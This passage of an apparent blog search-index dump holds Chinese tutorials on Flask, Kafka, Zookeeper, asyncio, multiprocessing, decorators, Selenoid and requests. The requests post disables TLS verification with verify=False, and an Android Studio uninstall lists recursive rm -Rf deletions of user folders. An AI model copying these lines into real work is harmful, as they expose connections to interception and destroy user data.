在flask中，通常结合jinja2做模板的渲染。jinja2是一套流行的python模板语言 flask中静态模板的应用 jinja2简单介绍 jinja2 使用一个名为Environment的中心对象，这个类用于存储配置，全局对象。如果不是结合flask来使用jinja2的话，那么你需要使用以下的语法 1234567891011from jinja2 import Environment,PackageLoader# 新建templates文件夹在当前目录下，里面放置模板# 因为我们是直接运行这个文件，所以第一个参数填的是main。# 如果不是当前的文件执行，可以填写python的包名env = Environment(loader=PackageLoader(&apos;main&apos;,&apos;templates&apos;))template = env.get_template(&apos;index.html&apos;)with open(&apos;index.html&apos;,&apos;w&apos;)as f: f.write(template.render(title=&apos;welcome&apos;,welcome=&apos;Hello jinja2&apos;)) flask中的jinja2 flask中的jinja2不用这么麻烦，只要在当前的app下面新建好templates的文件夹，在views里面就可以直接使用render_template进行模板渲染了。下面介绍常见模板用法 普通用法 123456789#microapp/templates/_layout.html&lt;html&gt; &lt;head&gt; &#123;% block title %&#125;&#123;% endblock %&#125; &lt;/head&gt; &lt;body&gt; &#123;% block main %&#125;&#123;% endblock %&#125; &lt;/body&gt;&lt;/html 模板继承 12345678# microapp/templates/index.html&#123;% extends &quot;_layout.html&quot; %&#125;&#123;% block title %&#125;&lt;title&gt;Hello&lt;/title&gt;&#123;% endblock %&#125;&#123;% block main %&#125; &lt;h1&gt;here is content &lt;/h1&gt;&#123;% endblock %&#125; 模板包含 123456789# 包含&#123;% extends &quot;_layout.html&quot; %&#125;&#123;% block content %&#125; ... &#123;% include &quot;_posts.html&quot; %&#125; &#123;% include &quot;_pagination.html&quot;%&#125;&lt;/div&gt; &#123;% endblock %&#125; 循环 123&#123;% for post in posts %&#125;...&#123;% endfor %&#125; 条件 123&#123;% if current_user.is_authenticated %&#125; ...&#123;% endif %&#125; 变量 12345&#123;% with message = get_flashed_messages() %&#125; &#123;% if message %&#125; alert(&quot;&#123;&#123; message &#125;&#125;&quot;) &#123;% endif %&#125;&#123;% endwith %&#125;","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"0x001-初始化项目","slug":"flask/0x001-初始化项目","date":"2018-08-08T14:12:08.000Z","updated":"2018-08-12T10:00:57.764Z","comments":true,"path":"2018/08/08/flask/0x001-初始化项目/","link":"","permalink":"http://yoursite.com/2018/08/08/flask/0x001-初始化项目/","excerpt":"","text":"初始化项目 准备工作 安装python3 下载 点击 安装 创建python虚拟环境 123456python -m venv venv# windows.\\venv\\Scripts\\activate# macsource venv/bin/activate 安装相关依赖 1pip install flask 初始化项目 项目结构 12345678910111213141516171819202122232425microapp --auth --__init__.py --forms.py --views.py --home --__init__.py --forms.py --views.py --profile --__init__.py --forms.py --views.py --templates --static __init__.py common.py email.py errors.py models.py exceptions.pytestvenvrun.pyconfig.py 初始化flask 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyfrom flask_migrate import Migrate from flask_login import LoginManagerimport osimport loggingfrom logging.handlers import RotatingFileHandlerfrom flask_mail import Mailfrom flask_bootstrap import Bootstrapdb = SQLAlchemy()migrate = Migrate()loginmanager = LoginManager()loginmanager.login_view = 'auth.login'loginmanager.login_message = u\"Please login to access this url\"loginmanager.session_protection = \"strong\"mail = Mail()bootstrap = Bootstrap()def create_app(ConfigObejct): # 指明flask的应用所在，用于以后templates/static等文件位置的放置 app = Flask(__name__) app.config.from_object(ConfigObejct) db.init_app(app) migrate.init_app(app,db) loginmanager.init_app(app) mail.init_app(app) bootstrap.init_app(app) def init_app(self): pass from .auth import auth as auth_blueprint app.register_blueprint(auth_blueprint,url_prefix='/') from .home import home as home_blueprint app.register_blueprint(home_blueprint,url_prefix='/') from .profiles import profiles as profiles_blueprint app.register_blueprint(profiles_blueprint,url_prefix='/profile') if not app.debug: if not os.path.exists('logs'): os.mkdir('logs') file_handler = RotatingFileHandler('logs/microblog.log',maxBytes=10240,backupCount=10) file_handler.setFormatter(logging.Formatter( '%(asctime)s %(levelname)s:%(message)s [in %(pathname)s:%(lineno)d]' )) app.logger.addHandler(file_handler) app.logger.setLevel(logging.INFO) app.logger.info(\"app startup\") return app 初始化蓝图对象 123456789# microapp/auth/__init__.py#!/usr/bin/env python #-*- coding:utf-8 -*-from flask import Blueprintauth = Blueprint(&apos;auth&apos;,__name__)from . import routes,forms","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"kafka入门","slug":"linux/kafka入门","date":"2018-08-01T15:36:35.000Z","updated":"2018-08-01T15:37:02.150Z","comments":true,"path":"2018/08/01/linux/kafka入门/","link":"","permalink":"http://yoursite.com/2018/08/01/linux/kafka入门/","excerpt":"","text":"安装Kafka 根据架构，我们再安装kafka服务器，因为资源问题，我们已经虚拟了3台zookeeper服务器，接着我们就在一台虚拟机上面虚拟3个kafka服务，使之成为一个伪集群的概念 简介 kafka目前的定位是分布式流式处理平台和消息引擎。其核心架构： 生产者发送消息给kafka服务器 消费者从kafka服务器读取消息 kafka服务器依托zookeeper集群进行服务的协调管理。 安装 首先我们需要三份配置文件，如下 123456789101112131415161718192021222324252627282930#config/server1.propertiesborker.id=0delete.topic.enable=truelisteners=PLAINTEXT://192.168.31.64:9092log.dirs=/data/logs/kafka1zookeeper.connect=192.168.31.144:2181,192.168.31.20:2181,192.168.31.223:2181unclean.leader.election.enable=falsezookeeper.connection.timeout.ms=6000---# config/server2.propertiesborker.id=1delete.topic.enable=truelisteners=PLAINTEXT://192.168.31.64:9093log.dirs=/data/logs/kafka2zookeeper.connect=192.168.31.144:2181,192.168.31.20:2181,192.168.31.223:2181unclean.leader.election.enable=falsezookeeper.connection.timeout.ms=6000---# config/server3.propertiesborker.id=2delete.topic.enable=truelisteners=PLAINTEXT://192.168.31.64:9094log.dirs=/data/logs/kafka3zookeeper.connect=192.168.31.144:2181,192.168.31.20:2181,192.168.31.223:2181unclean.leader.election.enable=falsezookeeper.connection.timeout.ms=6000 安装jps 1yum install java-1.8.0-openjdk-devel.x86_64 -y 启动kafka服务器 123./bin/kafka-server-start.sh -daemon config/server1.properties ./bin/kafka-server-start.sh -daemon config/server2.properties ./bin/kafka-server-start.sh -daemon config/server3.properties 验证服务启动 123456&gt;&gt;&gt; jps|grep Kafka结果：39969 Kafka39364 Kafka39644 Kafka 验证部署 我们要验证一下我们部署的可用性。 测试topic创建和删除 1234567891011# 创建./bin/kafka-topics.sh --zookeeper 192.168.31.144:2181,192.168.31.223:2181,192.168.31.20:2181 --create --topic test-topic --partitions 3 --replication-factor 3# 查看topic./bin/kafka-topics.sh --zookeeper 192.168.31.144:2181,192.168.31.223:2181,192.168.31.20:2181 -list# 查看分区信息./bin/kafka-topics.sh --zookeeper 192.168.31.144:2181,192.168.31.223:2181,192.168.31.20:2181 --describe --topic test-topic # 删除./bin/kafka-topics.sh --zookeeper 192.168.31.144:2181,192.168.31.223:2181,192.168.31.20:2181 --delete --topic test-topic 测试消息发送和消费 123456# 开两个终端# 生产者./bin/kafka-console-producer.sh --broker-list 192.168.31.64:9092,192.168.31.64:9093,192.168.31.64:9094 --topic test-topic# 消费者./bin/kafka-console-consumer.sh --bootstrap-server 192.168.31.64:9092,192.168.31.64:9093,192.168.31.64:9094 --topic test-topic --from-beginning kafka开发 概述 无论kafka如何变化，其核心一定是有外部的生产者给自己发送信息，然后有外部的消费者读取信息。kafka封装了一套二进制通信协议，可以使用任何的语言，按照这套协议进行开发编程，在这里我们使用python进行实践 producer 123456789101112131415161718192021222324252627#!/usr/bin/env python #-*- coding:utf-8 -*-from kafka import KafkaProducerfrom kafka.errors import KafkaErrorimport jsonproducer = KafkaProducer(bootstrap_servers=[&apos;192.168.31.64:9092&apos;,&apos;192.168.31.64:9093&apos;,&apos;192.168.31.64:9094&apos;],retries=5)# Asynchronous by defaultfuture = producer.send(&apos;my-topic&apos;, b&apos;raw_bytes&apos;)# Block for &apos;synchronous&apos; sendstry: record_metadata = future.get(timeout=10)except KafkaError: # Decide what to do if produce request failed... log.exception() passprint (record_metadata.topic)print (record_metadata.partition)print (record_metadata.offset)producer.send(&apos;my-topic&apos;,key=b&apos;test&apos;,value=b&apos;this is testing message&apos;)producer2 = KafkaProducer(bootstrap_servers=[&apos;192.168.31.64:9092&apos;,&apos;192.168.31.64:9093&apos;,&apos;192.168.31.64:9094&apos;],value_serializer=lambda m:json.dumps(m).encode(&apos;utf-8&apos;))producer2.send(&apos;json-files&apos;,&apos;&#123;&quot;keyxxxx&quot;:&quot;valuexxx&quot;&#125;&apos;) consumer 1234567891011121314from kafka import KafkaConsumer# To consume latest messages and auto-commit offsetsconsumer = KafkaConsumer(&apos;my-topic&apos;, group_id=&apos;my-group&apos;, bootstrap_servers=[&apos;192.168.31.64:9092&apos;,&apos;192.168.31.64:9093&apos;,&apos;192.168.31.64:9094&apos;])for message in consumer: # message value and key are raw bytes -- decode if necessary! # e.g., for unicode: `message.value.decode(&apos;utf-8&apos;)` print (&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition, message.offset, message.key, message.value))# 实时取得数据 参考 -bash: jps: command not found server.properties配置实践 consumber producer","categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"zookeeper简介","slug":"linux/zookeeper简介","date":"2018-07-30T15:29:11.000Z","updated":"2018-07-30T15:30:24.576Z","comments":true,"path":"2018/07/30/linux/zookeeper简介/","link":"","permalink":"http://yoursite.com/2018/07/30/linux/zookeeper简介/","excerpt":"","text":"安装Zookeeper 简介 Zookeeper 是一个非常流行的分布式系统协调服务，目前的应用非常的广泛，其主要特点： 分布式集群 高可用性 奇数个节点 其应用场景有如下： 服务器主从选举。假设我们有多个服务器需要提供服务，但是为了数据的一致性，我们需要每一个时刻只能有一个服务器来提供服务，其他服务器做为主服务器的备份，如果主服务器挂了，立马备份服务器就成了主服务器进行工作。这种场景常见于数据库服务器 批量更新配置，如果我们有多个服务器节点需要更新配置文件的内容，这个时候如果挨个去改，很容易出错，尤其是服务器很多的情况下，统一推送配置文件，就显得很重要。因此我们可以将配置文件存放在第三方，修改后，通知zookeeper通知其他节点，各个节点自己读取配置文件。 安装 安装Jdk 1yum install jdk -y 下载zookeeper 1231. 下载2. 解压tar -zxvf zookeeper.tar.gz zookeeper的配置文件 12345678910# 文件位于 zookeeper/conf/zoo.cfgtickTime=2000dataDir=/data/zookeeperclientPort=2181initLimit=5syncLimit=2server.1=192.168.31.144:2888:3888server.2=192.168.31.20:2888:3888server.3=192.168.31.223:2888:3888 将zookeeper复制到多个服务器上面 12scp -r zookeeper root@192.168.31.20:.scp -r zookeeper root@192.168.31.44:. 启动 1./zookeeper/bin/zkServer.sh start 查看状态 1./zookeeper/bin/zkServer.sh status 完成后 python+zookeeper 12345678910111213141516171819202122232425from kazoo.client import KazooClientzk = KazooClient(hosts=\"192.168.31.144:2181,192.168.31.20:2181,192.168.31.223:2181\")zk.start()# 删除节点zk.delete(\"/bb/aa/validator\",recursive=True)# 创建节点result = zk.create('/bb/aa/validator',b'validator_huabei_1')print(result)# 更新节点zk.set(\"/bb/aa/validator\",b\"updated new message\")# 获取节点data,stat = zk.get(\"/bb/aa/validator\")print(data.decode('utf-8'))print(stat)#zk.delete(\"/bb/aa/validator\",recursive=True)# 监听节点@zk.DataWatch(\"/bb/aa/validator\")def watch_node(data, stat): print(\"Version: %s, data: %s\" % (stat, data.decode(\"utf-8\"))) 参考 ZooKeeper简介与安装 zookeeper伪集群启动失败失败：Invalid config, exiting abnormally Python与ZooKeeper集群连接","categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"python模块-协程","slug":"python/python模块-协程","date":"2018-07-25T13:41:40.000Z","updated":"2018-08-10T13:39:32.367Z","comments":true,"path":"2018/07/25/python/python模块-协程/","link":"","permalink":"http://yoursite.com/2018/07/25/python/python模块-协程/","excerpt":"","text":"协程 首先写一段简单的代码 12345678910111213import asyncioasync def test1(): await test2() print(&apos;This is test1&apos;) async def test2(): print(&quot;This is test2&quot;)if __name__ ==&quot;__main__&quot;: b = test1() b.send(None) 很简单的代码，加上async以后，这个函数就成了一个异步函数。异步函数需要通过send() 方法才能执行。否则会报错。 之前的疑惑 之前最大的疑惑就是，test2都被挂起在那里了，就只有单线程，单线程都去执行test1了，怎么test2还会有值会返回？ 后来陆续看了一些文章，涉及到了系统底层。 系统将这样的IO变化称之为事件变化，提供了专门的模块来进行处理， 所以，很明显test2触发了，比如发送请求了，但是没返回，所以先把test2挂起来以后，就由系统去检测其IO变化. 一旦有值返回了，系统回来告诉应用程序， 应用程序通过回调函数对值做处理。 简单的协程代码 在python里面，只有调用了 send方法，协程函数才会去调用一次，所以要整个协程放进去事件循环里面，才能完全的执行完协程函数。 1234567891011121314151617181920212223242526272829import asynciofrom datetime import datetime&apos;&apos;&apos;test1 start 2018-07-25 14:35:56.808890test1 start 2018-07-25 14:35:56.808890test1 start 2018-07-25 14:35:56.808890test1 done 2018-07-25 14:36:01.835863test1 done 2018-07-25 14:36:01.835863test1 done 2018-07-25 14:36:01.835863&apos;&apos;&apos;async def test1(): print(&quot;test1 start &#123;&#125;&quot;.format(datetime.now())) await asyncio.sleep(5) print(&quot;test1 done &#123;&#125;&quot;.format(datetime.now()))if __name__ == &quot;__main__&quot;: a = test1() b = test1() c = test1() loop = asyncio.get_event_loop() tasks = [ asyncio.ensure_future(a), asyncio.ensure_future(b), asyncio.ensure_future(c), ] loop.run_until_complete(asyncio.wait(tasks)) # 如果是task，必须要wait一下。 在这一段代码里面，run_until_complete将协程包装成了一个task对象，也就是Future类的子类. 保存了协程运行后的状态，方便后面IO变化以后，用于获取协程的结果。 增加回调函数 1234567891011121314151617181920import asyncio&apos;&apos;&apos;I am test1 and the param is 2the waitting x is 20&apos;&apos;&apos;async def test1(x): print(&quot;I am test1 and the param is &#123;&#125;&quot;.format(x)) await asyncio.sleep(10) return x*10# param 是一个future对象。想象一下，这个类来自未来。def callback(param): print(&apos;the waitting x is &#123;&#125;&apos;.format(param.result()))a = test1(2)loop = asyncio.get_event_loop()task = asyncio.ensure_future(a)task.add_done_callback(callback)loop.run_until_complete(task) 调用了一个回调函数，用于处理异步函数test1的返回值。 如果回调函数需要增加参数，可以使用functools.partial。 使用回调函数需要十分小心，避免掉进回调的地狱。 这里我们使用同步的方式来处理异步函数返回来的值，而不一定使用回调函数， 其方式就是借用future对象，可以取到异步执行后的值。 1234567891011121314151617import asyncio&apos;&apos;&apos;I am test1 and the param is 220&apos;&apos;&apos;async def test1(x): print(&quot;I am test1 and the param is &#123;&#125;&quot;.format(x)) await asyncio.sleep(10) # 这里是异步操作，所以可以挂起 return x*10a = test1(2)loop = asyncio.get_event_loop()# task 是来自未来的对象task = asyncio.ensure_future(a)loop.run_until_complete(task)print(task.result()) 线程阻塞问题 在使用requests的时候，会阻塞掉唯一的线程，就是说你的函数虽然是异步的， 但是在这个异步的函数里面，有阻塞线程的调用. 于是，你没办法挂起这个函数。这个时候，可以开一个线程让它去阻塞，而当前线程继续执行。 当然这样做，就成了多线程了就是。 1234567891011121314151617181920212223242526272829303132333435import asynciofrom datetime import datetimeimport time,requestsasync def run(url): loop = asyncio.get_event_loop() print(&apos;start &#123;&#125; and time is &#123;&#125;&apos;.format(url,datetime.now())) try: task = loop.run_in_executor(None,requests.get,url) #task2 = loop.run_in_executor(None,time.sleep,10) complete,pending = await asyncio.wait([task]) for t in complete: print(t.result()) except Exception as e: print(e) print(&apos;done &#123;&#125; and time is &#123;&#125;&apos;.format(url,datetime.now()))url_list = [&apos;http://www.baidu.com&apos;,&apos;http://www.google.com&apos;,&apos;http://www.sina.com.cn&apos;]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()# 这里是并发的场景，每当有协程挂起，就需要wait，如果没加，就会报错。loop.run_until_complete(asyncio.wait(tasks))&gt;&gt;&gt;&gt;start http://www.baidu.com and time is 2018-07-25 15:37:57.221670start http://www.google.com and time is 2018-07-25 15:37:57.222670start http://www.sina.com.cn and time is 2018-07-25 15:37:57.223670done http://www.sina.com.cn and time is 2018-07-25 15:38:07.759670done http://www.google.com and time is 2018-07-25 15:38:07.936670done http://www.baidu.com and time is 2018-07-25 15:38:08.014670 总结 在协程中，因为很多请求是同步的，会阻塞掉当前的线程，你根本无法挂起这个请求，执行并发，除非使用一些异步框架来做，或者如上开一个另外的线程来 做这种阻塞的动作。这样其实跟多线程没啥区别了，有待研究。当然可以使用gevent这样的框架来做，可以用写同步函数的方式来做异步IO的事情，执行并发等等，但是也有其他的一些缺陷，但是对其底层不了解的话，很容易出现不知所谓的错误。 优点： 协程开销小 缺点： 复杂 一旦异步，全部都必须异步。 reference http://www.dongwm.com/archives/使用Python进行并发编程-asyncio篇/ http://thief.one/2018/06/21/1/","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块-多进程","slug":"python/python模块-多进程","date":"2018-07-25T12:47:20.000Z","updated":"2018-08-10T13:39:35.547Z","comments":true,"path":"2018/07/25/python/python模块-多进程/","link":"","permalink":"http://yoursite.com/2018/07/25/python/python模块-多进程/","excerpt":"","text":"概述 [x] 多进程概念 [x] 多进程的Process [x] 多进程的Pool [x] 多进程的Pool相关函数 [x] 基于队列的多进程 多进程概念 顾名思义，多进程就是多个进程，可以并发执行任务，从而提高效率，在python中，因为全局锁的原因，对于CPU密集的任务，多线程起不到任何的作用，反而会因为线程切换，而导致效率下降。而多进程可以解决这个问题。 多进程一般有两种实现方式 Process Pool 多进程的Process 首先先上代码 12345678910111213from multiprocessing import Processimport osfrom datetime import datetimedef run_proc(name): print(&apos;Child process &#123;0&#125; is running&apos;.format(name,os.getpid()))if __name__ == &quot;__main__&quot;: print(&apos;parent process &#123;&#125; is running&apos;.format(os.getpid())) for i in range(5): p = Process(target=run_proc,args=(str(i),)) print(&apos;process start &#123;&#125;&apos;.format(datetime.now())) p.start() p.join() print(&apos;close&apos;) 很简单的代码示例，跟多线程有点像。 多进程的Pool 有时候进程开的太多容易使得程序崩溃。这个时候可以通过进程池来解决这个问题，如果启动的进程达到了池子里面的数量，就会先执行当前的进程，执行完一个再放进来一个。 代码 12345678910111213141516171819202122232425#!/usr/bin/env python#-*-coding:utf-8-*-# Pool 指定数量的进程，默认是CPU数量，如果池子没有满，就创建一个新进程，否则就等待# apply_async 允许多个进程进入池子进行执行# apply 只允许一个进程from multiprocessing import Process,Poolimport osfrom datetime import datetimeimport timedef run_proc(i): time.sleep(10) print(&apos;[process &#123;&#125;]I am child process &#123;&#125; and the start time is &#123;&#125;&apos;.format(i,os.getpid(),datetime.now())) time.sleep(10) print(&apos;task done&apos;)if __name__ == &quot;__main__&quot;: p = Pool(processes=os.cpu_count()) for i in range(10): p.apply_async(run_proc,args=(str(i),)) #p.apply(run_proc,args=(str(i),)) p.close() p.join() print(&apos;all done&apos;) 多进程的Pool相关函数 start() 启动进程 join() 跟多线程一样，使用了join函数，会使得主进程等待子进程结束才会结束，否则就会提前结束 name 这不是函数，是一个属性，指的是进程的名字 is_alive() 检查进程是否存活，除非进程terminates了。 close() close函数必须要在join函数前面，调用了close函数以后，就不能再添加进程了。这里的close指的是关闭进程池。在Pool里面一定要关闭进程池，而且必须要在join面前，要不执行不了。找不到更多的解释，估计很多人也是一知半解。 terminate 结束当前的进程，不在处理 基于队列的多进程 一个简单的多进程队列例子 1234567891011121314151617181920212223242526#!/usr/bin/env python#-*- coding:utf-8 -*-from multiprocessing import Queue,Pool,Process# 使用队列进行多进程def producer(q): for i in range(20): q.put(i)def worker(q): while not q.empty(): item = q.get() print(item)if __name__ == &quot;__main__&quot;: # 在这里加入队列 q=Queue() producer(q) for i in range(10): p = Process(target=worker,args=(q,)) p.start() p.join() print(&quot;done&quot;) 但是需要注意的是，这里的Queue只适用于Process在，不适用于Pool","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"移动端测试1-MAC下配置Android Studio环境","slug":"appium/移动端测试1-MAC下配置Android-Studio环境","date":"2018-07-22T14:33:51.000Z","updated":"2018-08-12T10:09:05.324Z","comments":true,"path":"2018/07/22/appium/移动端测试1-MAC下配置Android-Studio环境/","link":"","permalink":"http://yoursite.com/2018/07/22/appium/移动端测试1-MAC下配置Android-Studio环境/","excerpt":"","text":"概述 本来安装工具这种东西是没什么好记录的，点点点就完了，但是因为我国的特殊网络环境，发现在下载android的SDK，一直报&quot; SDK tools directory is missing&quot; 试过多种方法，多种镜像网站，发现均不能下载。最后终于找到解决方法了 解决方案 设置代理 testhome提供了http代理地址： 其中port number，比如今天是7月22号，port number就是 60722 删除 还有一个坑就是，在mac下面删除android，直接从app里面删除是不够的。下面提供彻底删除的方法： 123456789rm -Rf /Applications/Android\\ Studio.apprm -Rf ~/Library/Preferences/AndroidStudio*rm ~/Library/Preferences/com.google.android.studio.plistrm -Rf ~/Library/Application\\ Support/AndroidStudio*rm -Rf ~/Library/Logs/AndroidStudio*rm -Rf ~/Library/Caches/AndroidStudio*rm -Rf ~/.gradlerm -Rf ~/.androidrm -Rf ~/Library/Android* 总结 算是做为了解移动端的一个起步吧。","categories":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/categories/appium/"}],"tags":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"python学习-装饰器","slug":"python/python学习-装饰器","date":"2018-07-22T14:17:13.000Z","updated":"2018-08-10T13:38:46.338Z","comments":true,"path":"2018/07/22/python/python学习-装饰器/","link":"","permalink":"http://yoursite.com/2018/07/22/python/python学习-装饰器/","excerpt":"","text":"概述 学习一下python的装饰器函数。关于装饰器的定义，底层，肯定说得不如网上的文章好。这里就简单记录一下其使用。 需求 python的装饰器其实是一种面向切面的编程方式，可以将大量可复用的代码抽离出来进行复用，这样的编程方式显得优雅。其主要需求有几种： 插入日志 性能测试 权限检验 事务处理 缓存 … 语法 装饰器的语法也很简单，其原理可以先这样理解： 假设我们要为一个函数打印log 123456789def foo(): print(&quot;I am foo&quot;) def print_log_for_foo(func): print(&quot;Hello log&quot;) func() print_log_for_foo(foo) 这样我们就为foo打印了log，但不是很优雅，因为我们调用的是另一个函数，这样显得杂乱无章。用了装饰器就显得清晰明白了 12345678910111213141516def decoration(func): def wrapper(*args,**kw): print(&quot;Hello logs&quot;) return func(*args,**kw) return wrapper@decoration def foo(): print(&apos;Hello I am foo&apos;) foo() # 调用foo&gt;&gt;&gt; 输出Hello logsHello I am foo 同样的，这样还存在一些问题，[foo函数]被[wrapper函数]包裹住了，这个时候，函数的元信息就变成了[wrapper函数]的了. 1print(foo.__name__) # wrapper 这个时候我们要引入另一个装饰函数，把元信息也给传进去. 所以废话这么多，完整的case是 12345678910111213141516171819from functools import wrapsdef decoration(func): @wraps(func) def wrapper(*args,**kw): print(&quot;Hello logs&quot;) return func(*args,**kw) return wrapper@decoration def foo(): print(&apos;Hello I am foo&apos;) a = foo() # 调用fooprint(foo.__name__) # foo&gt;&gt;&gt; 输出Hello logsHello I am foofoo 类装饰器 类也有装饰器，其装饰器是通过函数```来实现的.通过@调用了这个函数12 class Decorations(object): def init(self,func): self.func = func def __call__(self): print('Hello i am decarations') self.func() @Decorations def foo(): print(‘i am foo’) foo() 123456789类装饰器具有以下优点1. 灵活度大2. 高内聚3. 封装性# 总结当然平时一些小东西，也就用函数装饰器就足够使用了。最后附上写flask时候验证admin权限的装饰器 def adminRequired(func): @functools.wraps(func) def decoration(*args,**kw): if current_user.is_authenticated and current_user.is_admin == 1: return func(*args,**kw) else: return redirect(url_for(‘auth.login’)) return decoration @admin.route(’/’) @adminRequired def home(): return “Hello This is admin” # 参考 https://foofish.net/python-decorator.html https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014318435599930270c0381a3b44db991cd6d858064ac0000","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"自动化测试-ui自动化+docker","slug":"test/自动化测试-ui自动化-docker","date":"2018-07-19T15:54:54.000Z","updated":"2018-08-12T10:09:56.149Z","comments":true,"path":"2018/07/19/test/自动化测试-ui自动化-docker/","link":"","permalink":"http://yoursite.com/2018/07/19/test/自动化测试-ui自动化-docker/","excerpt":"","text":"概述 在docker里面创建UI自动化测试平台 搭建环境 安装docker 详细见docker官方文档 安装selenoid 123456789101112131415161718192021222324docker pull aerokube/selenoid:latest-releasemkdir -p /data/configvim /data/config/browsers.json---------------------------&#123; &quot;firefox&quot;: &#123; &quot;default&quot;: &quot;57.0&quot;, &quot;versions&quot;: &#123; &quot;57.0&quot;: &#123; &quot;image&quot;: &quot;selenoid/vnc:firefox_57.0&quot;, &quot;port&quot;: &quot;4444&quot;, &quot;path&quot;: &quot;/wd/hub&quot; &#125; &#125; &#125;&#125;---------------------------docker run -d \\--name selenoid \\-p 14444:4444 \\-v /data/config:/etc/selenoid/:ro \\-v /var/run/docker.sock:/var/run/docker.sock \\aerokube/selenoid:latest-release 注意：最好使用其他的端口转发4444端口。4444端口不是安全的，应该禁止掉。 安装selenoid ui 12345docker pull aerokube/selenoid-ui如果selenoid是跟selenoid-ui安装在一起的话，那么需要查看selenoid的IP&gt;&gt;&gt; ifconfig | grep -E &quot;([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | grep -v 127.0.0.1 | awk &apos;&#123; print $2 &#125;&apos; | cut -f2 -d: | head -n1&gt;&gt;&gt; 172.17.0.1&gt;&gt;&gt; docker run -d --name selenoid-ui -p 8080:8080 aerokube/selenoid-ui --selenoid-uri http://172.17.0.1:14444 操作 在本地写好脚本，用python撸了一个 1234567891011121314import selenium from selenium import webdriver capabilities = &#123; &quot;browserName&quot;: &quot;firefox&quot;, &quot;version&quot;: &quot;57.0&quot;&#125;driver = webdriver.Remote( command_executor=&quot;http://192.168.31.236:4444/wd/hub&quot;, desired_capabilities=capabilities)driver.get(&apos;https://www.baidu.com&apos;)print(driver.title) 然后你就可以看到成功运行的样子 总结 然后打开 http://yourip:8080 就可以打开相应的webUI界面，在这里我们可以看到selenoid的使用方法，最后编写相应的脚本放上去跑就可以了。","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/测试/"}],"tags":[]},{"title":"python模块-requests","slug":"python/python模块-requests","date":"2018-07-08T15:32:50.000Z","updated":"2018-08-10T13:39:17.946Z","comments":true,"path":"2018/07/08/python/python模块-requests/","link":"","permalink":"http://yoursite.com/2018/07/08/python/python模块-requests/","excerpt":"","text":"概述 requests是python中热门的模块，它封装了python底层的库，并且更加容易使用。在python爬虫中非常常见的使用这个框架作为其请求的发送，这里记录其部分常见用法。 requests 安装 1pip install reqeusts 简单使用 POST请求 x-www-form-urlencode 12345data=&#123;&quot;xx&quot;:&quot;yy&quot;,&quot;aa&quot;:&quot;bb&quot;&#125;r = requests.post(&quot;http://www.posturl.com&quot;,data=data) json 12json=&quot;&#123;&apos;type&apos;:&apos;post&apos;,&apos;age&apos;:123&#125;&quot;r = requests.post(url,data=json) GET 1234headers=&#123;&quot;user-agent&quot;:&apos;xxxx&apos;,&#125;r=requests.get(url,headers=headers) 高级使用 有时候某些场景会出现SSL错误，我们需要禁用 1234from urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)requests.api.request(&apos;post&apos;, url, data=&#123;&apos;bar&apos;:&apos;baz&apos;&#125;, json=None, verify=False) 我们需要session来保持网站的连接 12session = requests.session()response = session.get(url) 上传文件模拟 12345&gt;&gt;&gt; url = &apos;http://httpbin.org/post&apos;&gt;&gt;&gt; files = &#123;&apos;file&apos;: (&apos;report.xls&apos;, open(&apos;report.xls&apos;, &apos;rb&apos;), &apos;application/vnd.ms-excel&apos;, &#123;&apos;Expires&apos;: &apos;0&apos;&#125;)&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text response.text 和 response.content 12text是正常的字符流content是二进制的字节流，常用于图片的传输 例子 结合unittest做API测试框架 12pip install html-testRunnerpip install requests 代码 1234567891011import HtmlTestRunnerimport unittestimport requestsclass TestPyRequest(unittest.TestCase): def setUp(self): self.url = 'https://api.douban.com' def test_douban_api(self): r = requests.get(self.url+'/v2/movie/top250',verify=False) self.assertTrue(r.status_code,200)if __name__ == '__main__': unittest.main(testRunner=HtmlTestRunner.HTMLTestRunner(output='.')) 以上我们就完成了一个以requests发送请求，以html-testRunner生成report，unittest作为验证断言的api框架，（以上代码只为简略的演示。） reference http://docs.python-requests.org/zh_CN/latest/","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块-click","slug":"python/python模块-click","date":"2018-07-02T16:14:16.000Z","updated":"2018-08-10T13:38:51.028Z","comments":true,"path":"2018/07/03/python/python模块-click/","link":"","permalink":"http://yoursite.com/2018/07/03/python/python模块-click/","excerpt":"","text":"概述 我们有时候要实现命令行带参数去执行函数的时候，可以使用click模块去实现，简单方便。 click常用语法 基础用法 